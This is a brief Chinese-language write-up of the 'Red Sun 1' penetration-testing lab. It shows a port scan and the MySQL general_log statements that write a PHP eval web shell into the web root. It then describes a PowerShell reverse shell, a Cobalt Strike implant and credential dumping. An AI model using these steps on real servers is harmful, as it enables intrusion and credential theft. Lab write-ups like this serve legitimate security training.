## 红日1
### win7 外网
`192.168.36.135`192.168.36.135
nmap扫端口
```text
Nmap scan report for 192.168.36.135
Host is up (0.00019s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1025/tcp open  NFS-or-IIS
1026/tcp open  LSA-or-nterm
1027/tcp open  IIS
1028/tcp open  unknown
1029/tcp open  ms-lsa
1057/tcp open  startron
3306/tcp open  mysql
```

dirb扫描到phpmyadmin,看到yxcms里有admin的密码,解出来得到`949ba59abbe56e05`

执行sql语句无法直接写入文件,采用日志文件getshell
(1) 开启日志记录:

set global general_log = "ON";
(2) 查看当前的日志目录:

show variables like 'general%';
(3) 指定日志文件

set global general_log_file = "C:/phpStudy/WWW/a.php";
(4)) 写入执行代码：

select "<?php eval($_POST['cmd']); ?>";

成功getshell
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240318222743.png)

使用powershell反弹一个shell回来,使用cs生成木马并使用蚁剑上传到靶机上

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240318225002.png)
成功上线cs

`logonpasswords`抓取密码

